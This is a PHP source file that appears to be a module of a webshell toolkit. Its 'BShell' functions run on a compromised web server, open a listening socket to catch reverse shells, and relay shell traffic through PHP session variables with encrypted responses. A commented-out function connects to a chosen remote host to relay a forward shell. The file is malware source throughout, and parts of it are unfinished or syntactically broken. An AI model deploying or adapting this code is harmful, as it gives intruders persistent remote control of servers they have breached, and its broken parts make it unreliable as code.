<?
@error_reporting(0);

function main($action,$target,$type,$listenPort,$params)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();

    if ($action=="create")
    {
        createBShell($target);
    }
    else if($action=="listen")
    {
        listenBShell($listenPort);
    }
    else if ($action=="list")
    {
        $BShellList=listBShell();
        $result["status"] = base64_encode("success");
        $result["msg"] = base64_encode(json_encode($BShellList));
        echo encrypt(json_encode($result));
    }
    else if ($action=="listReverse")
    {

    }
    else if ($action=="close")
    {

    }
    else if ($action=="stopReverse")
    {

    }
    else if ($action=="clear")
    {

    }
    else
    {

    }
}
function listenBShell($listenPort="")
{
    $result=array();
    if ($listenPort==="")
    {
        $listenPort=0;
    }
    else
    {
        $listenPort=(int)$listenPort;
    }
    $serverSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    socket_set_option($serverSocket, SOL_SOCKET, SO_REUSEPORT, 1);
    $bind = socket_bind($serverSocket, "0.0.0.0", $listenPort);
    if (!$bind) {
        $result["status"] = base64_encode("fail");
        $result["msg"] = base64_encode(socket_strerror($serverSocket));
        return $result;
    }

    $listen = socket_listen($serverSocket);
    if (!$listen) {
        $result["status"] = base64_encode("fail");
        $result["msg"] = base64_encode(socket_strerror($listen));
        return $result;
    }
    //socket_set_nonblock($serverSocket);
    $serverSocketHash = "BShell_listenPort" . $listenPort;
    @session_start();
    $_SESSION["BShell_listenPort"] = $listenPort;
    $_SESSION["BShell_listen"] = true;
    session_write_close();
    ob_end_clean();
    header("Connection: close");
    ignore_user_abort();
    ob_start();
    $size = ob_get_length();
    header("Content-Length: $size");
    ob_end_flush();
    flush();
    while($_SESSION["BShell_listen"])
    {
        $reverseBShellSocket = socket_accept($serverSocket); //把socket设置为block模式，这里会阻塞，符合需求
        if ($reverseBShellSocket !== false) {
            socket_getpeername($reverseBShellSocket, $address, $port);
            $reverseBShellSocketHash = "BShell_Reverse_"  . $address . ":" . $port;
             @session_start();
                                    $_SESSION[$reverseBShellSocketHash]=true;
                                    $_SESSION[$reverseBShellSocketHash."_read"]="";
                                    $_SESSION[$reverseBShellSocketHash."_write"]="";
                                    session_write_close();

            socket_set_nonblock($reverseBShellSocket);
            $clients[] = $reverseBShellSocket;
            $read = $clients;

                $write = $clients;

                if (socket_select($read, $write, $exp, null) > 0) {
                    foreach ($read as $socket_item) {
                        socket_getpeername($socket_item, $address, $port);
                        $reverseBShellSocketReadHash =  "BShell_Reverse_"  . $address . ":" . $port."_read";
                        $readContent = "";
                        $content = socket_read($socket_item, 2048);
                        while(strlen($content)>0)
                        {
                            $readContent=$readContent.$content;
                            $content = socket_read($socket_item, 2048);
                        }
                        @session_start();
                        $_SESSION[$reverseBShellSocketReadHash]=$_SESSION[$reverseBShellSocketReadHash].$readContent;
                        session_write_close();
                    }
                    foreach ($write as $socket_item) {
                        socket_getpeername($socket_item, $address, $port);
                        $reverseBShellSocketWriteHash = "BShell_Reverse_"  . $address . ":" . $port."_write";
                        @session_start();
                        $writeContent=$_SESSION[$reverseBShellSocketWriteHash];
                        if (strlen($writeContent)>0)
                        {
                        $count=socket_write($socket_item, $writeContent, strlen($writeContent));
                        }
                        $_SESSION[$reverseBShellSocketWriteHash]="";
                        session_write_close();
                    }
                }
        }
        sleep(1);
    }
}
function listBShell()
{
    $BShellList = array();
    //$directBShellPre = "BShell_Forward_";
    $reverseBShellPre = "BShell_Reverse_";
    foreach($_SESSION as $sessionKey=>$sessionValue)
    {
        if (strpos($sessionKey,$reverseBShellPre)===0&&strpos($sessionKey,"_write")===false&&strpos($sessionKey,"_read")===false)
        {
            $obj= array();
            $obj["target"]=base64_encode(str_replace($reverseBShellPre,"",$sessionKey));
            $obj["status"]=base64_encode("true");
            array_push($BShellList,$obj);
        }
        
    }
    return $BShellList;
}
/*
function createBShell($target)
{
    $target = explode(":", $target);
    $host = $target[0];
    $port = $target[1];
    $sockObj = getSocket($host, $port);
    $sock = $sockObj["s"];
    $s_type = $sockObj["s_type"];
    if ($s_type == 'error') {
        echo "\x37\x21\x49\x36Failed connecting to target" . $sock;
        return;
    }

    $socketRead = "socket_read";
    $socketWrite = "socket_write";
    $socketClose = "socket_close";
    $socketSelect = "socket_select";
    if ($s_type == 'stream') {
        $socketRead = "fread";
        $socketWrite = "fwrite";
        $socketClose = "fclose";
        $socketSelect = "stream_select";
    }
    if ($s_type == 'stream') {
        stream_set_blocking($sock, false);
    } else {
        socket_set_nonblock($sock);
    }
    if ($s_type=='stream')
    {
        stream_set_blocking($sock,false);
    }
    else
    {
        socket_set_nonblock($sock);
    }
    $BShellSocketHash=sprintf("BShell_Forward_%s",$target);
        @session_start();
        $_SESSION[$BShellSocketHash] = true;
        $_SESSION[$BShellSocketHash."_read"] = "";
        $_SESSION[$BShellSocketHash."_write"] = "";
        session_write_close();

        ob_end_clean();
        header("Connection: close");
        ignore_user_abort();
        ob_start();
        $size = ob_get_length();
        header("Content-Length: $size");
        ob_end_flush();
        flush();

        //fastcgi_finish_request();
        $clients[] = $reverseBShellSocket;
        $read = $clients;
        $write = $clients;

        while ($_SESSION[$BShellSocketHash])
        {
            if (socket_select($read, $write, $exp, null) > 0) {
                foreach ($read as $socket_item) {
                    socket_getpeername($socket_item, $address, $port);
                    $BShellSocketReadHash =  "BShell_Forward_"  .$target."_read";
                    $readContent = "";
                    $content = socket_read($socket_item, 2048);
                    while(strlen($content)>0)
                    {
                        $readContent=$readContent.$content;
                        $content = socket_read($socket_item, 2048);
                    }
                    @session_start();
                    $_SESSION[$BShellSocketReadHash]=$_SESSION[$BShellSocketReadHash].$readContent;
                    session_write_close();
                }
                foreach ($write as $socket_item) {
                    socket_getpeername($socket_item, $address, $port);
                    $BShellSocketWriteHash = "BShell_Forward_".$target"_write";
                    @session_start();
                    $writeContent=$_SESSION[$BShellSocketWriteHash];
                    if (strlen($writeContent)>0)
                    {
                    $count=socket_write($socket_item, $writeContent, strlen($writeContent));
                    }
                    $_SESSION[$BShellSocketWriteHash]="";
                    session_write_close();
                }
                foreach ($exp as $socket_item) {
                    socket_getpeername($socket_item, $address, $port);
                    $BShellSocketHash = "BShell_Forward_".$target"_write";
                    @session_start();
                    unset($_SESSION[$BShellSocketHash]);
                    unset($_SESSION[$BShellSocketHash."_read"]);
                    unset($_SESSION[$BShellSocketHash."_write"]);
                    session_write_close();
                }
            }
            sleep(1);
        }
        $socketClose($sock);
}
*/